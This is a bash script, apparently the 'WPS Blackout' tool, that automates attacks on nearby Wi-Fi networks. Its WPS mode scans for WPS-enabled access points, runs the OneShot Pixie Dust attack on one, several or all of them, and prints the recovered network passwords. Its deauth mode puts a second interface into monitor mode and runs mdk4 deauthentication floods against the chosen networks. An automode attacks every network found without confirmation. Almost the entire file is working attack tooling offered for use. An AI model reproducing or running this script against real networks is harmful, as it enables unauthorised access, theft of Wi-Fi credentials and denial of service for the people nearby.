#!/bin/bash
# WPS Blackout by @rkhunt3r

# sudo apt install tlp

ssid_config="config/ssid.txt"
settings_file="config/settings.conf"
source $settings_file

check_root() {
    banner
    if [[ $EUID -ne 0 ]]; then
        printf "\n\e[0m[\e[91m!\e[0m] Run this script as root! \n"
        exit 1
    fi
}

check_update() {
    check_internet
    changed=0
    git remote update && LC_ALL=C git status -uno | grep -q 'Your branch is behind' && changed=1
    if [ $changed = 1 ]; then
        updates=1
        updates_string="\e[0m\e[92mUpdate avaiable!\e[0m"
    else
        updates=0
        updates_string="\e[0m\e[93mNo updates avaiable\e[0m"
    fi
}

back_to_menu() {
    printf "\n\e[0m[\e[92mi\e[0m] Press [ENTER] to return to menu\n"
    read ener_empty_value
    blackout_menu
}

check_internet() {
    printf "\n\e[0m[\e[93m*\e[0m] Checking for internet connection... \n"
    if ! ping -q -c1 google.com &>/dev/null; then
        printf "\e[0m[\e[91m!\e[0m] Network isn't avaiable! \n"
        updates=0
        updates_string="\e[0m\e[91mCheck connection!\e[0m"
        back_to_menu
    fi
}

req_check() {
    banner
    if [ -d $(pwd)/config/OneShot ]; then
        printf "\n\e[0m[\e[92mi\e[0m] OneShot folder found! \n"
    else
        printf "\n\e[0m[\e[91m!\e[0m] OneShot folder not found! \n"
        git -C $(pwd)/config clone https://github.com/drygdryg/OneShot #clone oneshot repo
        sleep 2 && blackout_menu
    fi
}

chk_iface() {
    iface=$1
    if ip addr 2>/dev/null | grep -q "$iface"; then
        printf "\e[0m[\e[92mi\e[0m] \e[92m$iface\e[0m is up!\n"
        ip link set $iface up
        return 1
    else
        printf "\e[0m[\e[91m!\e[0m] \e[91m$iface\e[0m is down\n"
        back_to_menu
    fi

}

empty_input() {
    if [ -z "$input" ]; then
        printf "\n\e[0m[\e[91m!\e[0m] Input can't be empty!"
        back_to_menu
    fi
}

default_first_iface() {
    printf "\n\e[0m[\e[92mi\e[0m] Current first wireless iface = $first_iface\n"
    read -p "New value: " input
    empty_input
    sed -i "s/first_iface\=.*/first_iface=$input/" $settings_file
    source $settings_file
    config_settings
}

default_second_iface() {
    printf "\n\e[0m[\e[92mi\e[0m] Current second wireless iface = $second_iface\n"
    read -p "New value: " input
    empty_input
    sed -i "s/second_iface\=.*/second_iface=$input/" $settings_file
    source $settings_file
    config_settings
}

scan_accuracy_var() {
    printf "\n\e[0m[\e[92mi\e[0m] Current scan accuracy = $scan_accuracy\n"
    read -p "New value: " input
    empty_input
    sed -i "s/scan_accuracy\=.*/scan_accuracy=$input/" $settings_file
    source $settings_file
    config_settings
}

automode_var() {
    printf "\n\e[0m[\e[92mi\e[0m] Current autmode = $automode\n"
    read -p "New value: " input
    empty_input
    sed -i "s/automode\=.*/automode=$input/" $settings_file
    source $settings_file
    config_settings
}

mac_changer_var() {
    printf "\n\e[0m[\e[92mi\e[0m] Current wait for interface status = $mac_changer\n"
    read -p "New value: " input
    empty_input
    sed -i "s/waiter\=.*/waiter=$input/" $settings_file
    source $settings_file
    config_settings
}

reset_settings() {
    printf "\n\e[0m[\e[93m*\e[0m] Resetting config...\n"
    sleep 1
    sed -i "s/first_iface\=.*/first_iface=wlan0/" $settings_file
    sed -i "s/automode\=.*/automode=0/" $settings_file
    sed -i "s/scan_accuracy\=.*/scan_accuracy=2/" $settings_file
    sed -i "s/waiter\=.*/waiter=1/" $settings_file
    sed -i "s/second_iface\=.*/second_iface=wlan1/" $settings_file
    source $settings_file
    config_settings
}

settings_menu() {
    banner
    printf "[ Choose option: ]

[1] Update script
[2] Change settings
[*] Back

"
    read -p "Choice: " menuchoice

    case $menuchoice in
    1) update_me ;;
    2) config_settings ;;
    *) blackout_menu ;;
    esac

}

config_settings() {
    banner
    printf "<---- Current settings ---->
first_iface: \e[92m$first_iface\e[0m
second_iface: \e[92m$second_iface\e[0m
automode: \e[92m$automode\e[0m
waiter: \e[92m$waiter\e[0m
scan_accuracy: \e[92m$scan_accuracy\e[0m
<-------------------------->

[ Select setting to edit: ]

[1] Default wireless interface
[2] Second default fireless interface (with monitor mode support)
[3] Automode
[4] Wait for interface
[5] Scan accuracy
[6] Reset settings
[*] Back\n
"
    read -p "Choice: " sel
    case $sel in
    1) default_first_iface ;;
    2) default_second_iface ;;
    3) automode_var ;;
    4) mac_changer_var ;;
    5) scan_accuracy_var ;;
    6) reset_settings ;;
    *) settings_menu ;;
    esac
}

update_me() {

    if [ $updates == 1 ]; then
        printf "\n\e[0m[\e[93m*\e[0m] Updating blackout script! Please wait... \n"
        git stash
        git stash drop
        git pull
        printf "\n\e[0m[\e[92mi\e[0m] Done! Press [ENTER] to run updated script \n"
        read ener_empty_value
        sudo bash blackout.sh

    else
        printf "\n\e[0m[\e[91m!\e[0m] There is no updates avaiable! \n"
        back_to_menu
    fi

}

banner() {
    clear
    printf "\e[1m\e[38;5;82m"
    cat config/banner.txt
    printf "\e[0m"
}

blackout_menu() {
    banner
    printf "| \e[0m\e[96mBlackout UI v1 \e[0m | \e[0m\e[95mgithub.com/rkhunt3r/blackout\e[0m | $updates_string |

[ Choose option: ]

[1] WPS Blackout
[2] Deauth blackout 
[3] Settings
[*] Exit

"

    read -p "Choice: " menuchoice

    case $menuchoice in
    1) wps_blackout ;;
    2) deauth_blackout ;;
    3) settings_menu ;;
    *)
        printf "\n\e[0m[\e[93m*\e[0m] Exiting script..."
        exit
        ;;
    esac

}

wait_for() {
    iface=$1
    while ! ip route | grep -qoP "default via .+ dev $iface"; do
        printf "\n\e[0m[\e[93m*\e[0m] Waiting 8s for \e[92m$iface\e[0m to become avaiable...\n"
        nohup ifconfig $iface up >/dev/null 2>&1 &
        sleep 8
        wait
    done
}

set_managed() {
    iface=$1
    printf "\n\e[0m[\e[93m*\e[0m] Putting \e[92m$iface\e[0m in managed mode... \n"
    ip link set $iface down
    iw $iface set type managed
    ip link set $iface up
    printf "\e[0m[\e[92mi\e[0m] Enabled managed mode on \e[92m$iface\e[0m! \n"

}

set_mmode() {
    iface=$1
    printf "\n\e[0m[\e[93m*\e[0m] Putting \e[92m$iface\e[0m in monitor mode... \n"
    ip link set $iface down
    iw $iface set monitor control
    ip link set $iface up
    sleep 3
    printf "\e[0m[\e[92mi\e[0m] Enabled monitor mode on \e[92m$iface\e[0m! \n"
}

wps_blackout() {

    banner
    chk_iface $first_iface
    printf "\n\e[0m[\e[93m*\e[0m] Starting blackout... \n"
    printf "\n\e[0m[\e[93m*\e[0m] Scanning for WPS networks using config below:\n"

    printf "
<---------------------------Config--------------------------->
\e[96minterface\e[0m: \e[92m$first_iface\e[0m [ no monitor mode needed ]\n"
    if [ $automode == 1 ]; then
        printf "\e[96mautomode\e[0m: \e[92m$automode\e[0m [ automode is turned on ]\n"
    else
        printf "\e[96mautomode\e[0m: \e[91m$automode\e[0m [ automode is turned off ]\n"
    fi

    printf "\e[96mscan_accuracy\e[0m: \e[92m$scan_accuracy\e[0m [ repeating scan for \e[92m$scan_accuracy\e[0m times ]\n"

    if [ $blacklist == 1 ]; then
        count_blacklist=$(cat $blacklist_path | wc -l)
        printf "\e[96mblacklist\e[0m: \e[92m$blacklist\e[0m [ \e[92m$count_blacklist\e[0m ssids that attack failed on, will be hidden ]\n"
    else
        printf "\e[96mblacklist\e[0m: \e[91m$blacklist\e[0m [ displaying all ssids ]\n"
    fi

    mac=$(ifconfig $first_iface | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
    printf "\e[96mMAC address\e[0m [ Current \e[92m$first_iface\e[0m MAC is: \e[93m$mac\e[0m ]\n"

    printf "<------------------------------------------------------------>
"
    tput sc
    x=0
    while [ $x -lt $scan_accuracy ]; do
        #iq200 sorting wps networks by signal strenght
        awker="$(pwd)/config/wifi.awk"

        if [ $blacklist == 1 ]; then
            wps_all=$(iw dev $first_iface scan duration 15 | awk -f $awker | sort | grep -iv -f $blacklist_path)
            if [ ! -n "$wps_all" ]; then
                printf "\n\e[0m[\e[91m!\e[0m] Catched error! Retrying in 5s... \n"
                sleep 5
                wait_for $first_iface
                wps_blackout
            fi
        else
            wait_for $iface
            wps_all=$(iw dev $first_iface scan duration 15 | awk -f $awker | sort)
            if [ ! -n "$wps_all" ]; then
                printf "\n\e[0m[\e[91m!\e[0m] Catched error! Retrying in 5s... \n"
                sleep 5
                wait_for $first_iface
                wps_blackout
            fi
        fi
        wps_power=($(printf "$wps_all" | grep -a "yes" | awk '{print $1}'))
        wps_ssid=($(printf "$wps_all" | grep -a "yes" | awk '{print $5 $6}'))
        wps_bssid=($(printf "$wps_all" | grep -a "yes" | awk '{print $2}'))
        wps_channel=($(printf "$wps_all" | grep -a "yes" | awk '{print $4}'))
        tput rc
        i=0
        while [ $i -lt ${#wps_bssid[@]} ]; do
            printf "\n[\e[92m$((i + 1))\e[0m] \e[92m${wps_ssid[$i]} \e[93m${wps_bssid[$i]} \e[94mpwr:${wps_power[$i]} \e[96mchnl:${wps_channel[$i]}\e[0m"
            i=$((i + 1))
        done
        x=$((x + 1))
    done

    if [ ${#wps_bssid[@]} == 0 ]; then
        printf "\n\n\e[0m[\e[91m!\e[0m] No WPS networks found! \n"
        back_to_menu
    else
        printf "\n\n\e[0m[\e[92mi\e[0m] Found ${#wps_bssid[@]} WPS-open networks! \n"
    fi

    if [ $automode == 1 ]; then
        printf "\n\e[0m[\e[92mi\e[0m] Automode, selecting all! \n"
        target_bssid=("${wps_bssid[@]}")
        target_ssid=("${wps_ssid[@]}")
    else
        printf "\n[ Select (\e[92m1\e[0m-\e[92m${#wps_bssid[@]}\e[0m) \e[92mone\e[0m, \e[92mmultiple\e[0m comma-separated or press [\e[92mENTER\e[0m] for all target/s: ]\n\n"
        read -p "Choice: " target_number

        if [ -z "$target_number" ]; then
            printf "\n\e[0m[\e[92mi\e[0m] Selecting all networks! \n"
            target_bssid=("${wps_bssid[@]}")
            target_ssid=("${wps_ssid[@]}")
        else
            target_bssid=($(echo $target_number | {
                while read -d, i; do printf "${wps_bssid[$(($i - 1))]}\n"; done
                printf "${wps_bssid[$(($i - 1))]}\n"
            }))
            target_ssid=($(echo $target_number | {
                while read -d, i; do printf "${wps_ssid[$(($i - 1))]}\n"; done
                printf "${wps_ssid[$(($i - 1))]}\n"
            }))
        fi
    fi

    if [ $automode == 1 ]; then
        wifi_disconnect="y"
    else
        printf "\n[ Disconnect wifi before attack? (\e[92my\e[0m/\e[92mn\e[0m): ]\n\n"
        read -p "Choice: " wifi_disconnect
    fi

    if [ -z $wifi_disconnect ]; then
        printf "\n\e[0m[\e[91m!\e[0m] Empty input, not disconnecting! \n"
        disconnect=0
    elif [ "$wifi_disconnect" = "y" ] || [ "$wifi_disconnect" = "Y" ]; then
        printf "\n\e[0m[\e[92mi\e[0m] Disconnecting wifi! \n"
        disconnect=1
    else
        printf "\n\e[0m[\e[92mi\e[0m] Not disconnecting wifi! \n"
        disconnect=0
    fi

    if [ $disconnect == 1 ]; then
        LC_ALL=C nmcli --fields UUID,TIMESTAMP-REAL con show | grep -v "UUID\|TIMESTAMP-REAL\|never" | awk '{print $1}' | while read line; do
            nmcli con down uuid $line &>/dev/null
        done
    fi

    printf "\n\e[0m[\e[93m*\e[0m] Attacking network/s using OneShot... \n"

    trap ctrl_c INT
    function ctrl_c() {
        printf "\n\e[0m[\e[91m!\e[0m] [ Ctrl+C detected! \e[92ms\e[0m - skip target, \e[92mm\e[0m - menu, \e[92me\e[0m - exit script: ]\n\n"
        read -p "Choice: " ctrl_c_while

        case $ctrl_c_while in

        [sS] | [sS][kK][iI][pP])
            skipmode=1
            printf "\n\e[0m[\e[93m*\e[0m] Skipping target... \n"
            ;;
        [eE] | [eE][xX][iI][tT])
            printf "\n\e[0m[\e[93m*\e[0m] Exiting... \n"
            if [ $disconnect == 1 ]; then
                printf "\n\e[0m[\e[92mi\e[0m] Backing up wifi network connection...\n"
                LC_ALL=C nmcli --fields UUID,TIMESTAMP-REAL con show | grep -v "UUID\|TIMESTAMP-REAL\|never" | awk '{print $1}' | while read line; do
                    nmcli con up uuid $line &>/dev/null
                done
            fi
            exit
            ;;
        [mM] | [mM][eE][nN][uU])
            if [ $disconnect == 1 ]; then
                printf "\n\e[0m[\e[92mi\e[0m] Backing up wifi network connection...\n"
                LC_ALL=C nmcli --fields UUID,TIMESTAMP-REAL con show | grep -v "UUID\|TIMESTAMP-REAL\|never" | awk '{print $1}' | while read line; do
                    nmcli con up uuid $line &>/dev/null
                done
            fi
            printf "\n\e[0m[\e[93m*\e[0m] Backing to menu... \n"
            sleep 2
            blackout_menu
            ;;
        *)
            printf "\n\e[0m[\e[93m*\e[0m] Backing to menu... \n"
            sleep 2
            blackout_menu
            ;;
        esac

    }

    y=0
    while [ $y -lt ${#target_bssid[@]} ]; do
        printf "\n\e[0m[\e[93m*\e[0m] ($((y + 1))/${#target_bssid[@]}) Attacking ${target_ssid[$y]} (${target_bssid[$y]})\n\n"

        python3 $(pwd)/config/OneShot/oneshot.py -i $first_iface -b ${target_bssid[$y]} -K -F -w

        if [ $skipmode == 1 ]; then
            printf "\n\e[0m[\e[92mi\e[0m] Skipped!"
            skipmode=0
        else
            # stage1 - check creds file exist
            if [ ! -e $creds_path ]; then
                printf "\n\e[0m[\e[91m!\e[0m] stored.txt not generated yet, or $creds_path is invaild! \n"
            else
                # stage2 - check creds are saved to file
                psk=$(cat -v $creds_path | awk -v var="${target_bssid[$y]}" '$1 == "BSSID:" && $2 == var {p = 4} p > 0 {print $0; p--}' <$creds_path)
                if $(printf $psk | grep -q "BSSID"); then
                    printf "\n\e[0m[\e[92mi\e[0m] Found ${target_ssid[$y]} password! \n"
                    printf "\n\e[92m$psk\e[0m\n"
                else
                    # if not, add ssid to blacklist
                    printf "\n\e[0m[\e[91m!\e[0m] ${target_ssid[$y]} password not found! \n"
                    printf "\n\e[0m[\e[93m*\e[0m] Adding ${target_bssid[$y]} to blacklist... \n"
                    # check if bssid is already here
                    if grep -Fxq "${target_bssid[$y]}" $blacklist_path; then
                        printf "\n\e[0m[\e[92mi\e[0m] BSSID is already in blacklist!"
                    else
                        printf '%s\n' "${target_bssid[$y]}" >>$blacklist_path
                        printf "\n\e[0m[\e[92mi\e[0m] Added!"
                    fi
                fi
            fi
        fi

        if [ $automode == 0 ]; then
            if [ $y -lt $((${#target_bssid[@]} - 1)) ]; then
                printf "\n\e[0m[\e[92mi\e[0m] Press [ENTER] to continue...\n"
                read ener_empty_value
            fi
        else
            printf "\n\e[0m[\e[93m*\e[0m] Skipping target, automode is on!\n"
        fi

        y=$((y + 1))
    done

    if [ $disconnect == 1 ]; then
        printf "\n\n\e[0m[\e[92mi\e[0m] Backing up wifi network connection...\n"
        LC_ALL=C nmcli --fields UUID,TIMESTAMP-REAL con show | grep -v "UUID\|TIMESTAMP-REAL\|never" | awk '{print $1}' | while read line; do
            nmcli con up uuid $line &>/dev/null
        done
    fi
    back_to_menu
}

deauth_blackout() {
    banner
    chk_iface $second_iface
    printf "\n\e[0m[\e[93m*\e[0m] Starting blackout... \n"
    printf "\n\e[0m[\e[93m*\e[0m] Scanning for WiFi networks using config below:\n"

    printf "
<---------------------------Config--------------------------->
\e[96minterface\e[0m: \e[92m$second_iface\e[0m [ monitor mode support needed ]\n"
    if [ $automode == 1 ]; then
        printf "\e[96mautomode\e[0m: \e[92m$automode\e[0m [ automode is turned on ]\n"
    else
        printf "\e[96mautomode\e[0m: \e[91m$automode\e[0m [ automode is turned off ]\n"
    fi
    printf "\e[96mscan_accuracy\e[0m: \e[92m$scan_accuracy\e[0m [ repeating scan for \e[92m$scan_accuracy\e[0m times ]\n"

    mac=$(ifconfig $second_iface | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}')
    printf "\e[96mmac_changer\e[0m: [ Current \e[92m$second_iface\e[0m MAC is: \e[93m$mac\e[0m ]\n"

    printf "<------------------------------------------------------------>
"

    set_managed $second_iface

    tput sc
    x=0
    while [ $x -lt $scan_accuracy ]; do
        #iq200 sorting wps networks by signal strenght
        awker="$(pwd)/config/wifi.awk"
        wifi_all=$(iw dev $second_iface scan duration 15 | awk -f $awker | sort)
        wifi_power=($(printf "$wifi_all" | awk '{print $1}'))
        wifi_ssid=($(printf "$wifi_all" | awk '{print $5 $6}'))
        wifi_bssid=($(printf "$wifi_all" | awk '{print $2}'))
        wifi_channel=($(printf "$wifi_all" | awk '{print $4}'))
        tput rc
        i=0
        while [ $i -lt ${#wifi_bssid[@]} ]; do
            printf "\n[\e[92m$((i + 1))\e[0m] \e[92m${wifi_ssid[$i]} \e[93m${wifi_bssid[$i]} \e[94mpwr:${wifi_power[$i]} \e[96mchnl:${wifi_channel[$i]}\e[0m"
            i=$((i + 1))
        done
        x=$((x + 1))
    done

    if [ ${#wifi_bssid[@]} == 0 ]; then
        printf "\n\n\e[0m[\e[91m!\e[0m] No networks found! \n"
        back_to_menu
    else
        printf "\n\n\e[0m[\e[92mi\e[0m] Found ${#wifi_bssid[@]} networks! \n"
    fi

    printf "\n[ Select (\e[92m1\e[0m-\e[92m${#wifi_bssid[@]}\e[0m) \e[92mone\e[0m, \e[92mmultiple\e[0m comma-separated or press [\e[92mENTER\e[0m] for all target/s: ]\n\n"
    read -p "Choice: " wifi_number

    if [ $automode == 1 ] || [ -z "$wifi_number" ]; then
        printf "\n\e[0m[\e[92mi\e[0m] Selecting all networks! \n"
        target_bssid=("${wifi_bssid[@]}")
        target_ssid=("${wifi_ssid[@]}")
    else
        target_bssid=($(echo $wifi_number | {
            while read -d, i; do printf "${wifi_bssid[$(($i - 1))]}\n"; done
            printf "${wifi_bssid[$(($i - 1))]}\n"
        }))
        target_ssid=($(echo $wifi_number | {
            while read -d, i; do printf "${wifi_ssid[$(($i - 1))]}\n"; done
            printf "${wifi_ssid[$(($i - 1))]}\n"
        }))
    fi

    printf "\n\e[0m[\e[93m*\e[0m] Clearing old & writing ${#target_bssid[@]} new SSID/s to file...\n"

    printf "" >$ssid_config
    y=0
    while [ $y -lt ${#target_bssid[@]} ]; do
        printf "%s\n" "${target_bssid[$y]}" >>$ssid_config
        y=$((y + 1))
    done

    printf "\n\e[0m[\e[92mi\e[0m] Done!\n"

    set_mmode $second_iface

    printf "\n\e[0m[\e[93m*\e[0m] Running MDK4 on ${#target_bssid[@]} SSID/s, use Ctrl+C to abort!\n\n"
    mdk4 $second_iface d -b $ssid_config

}

check_root
check_update
req_check
blackout_menu
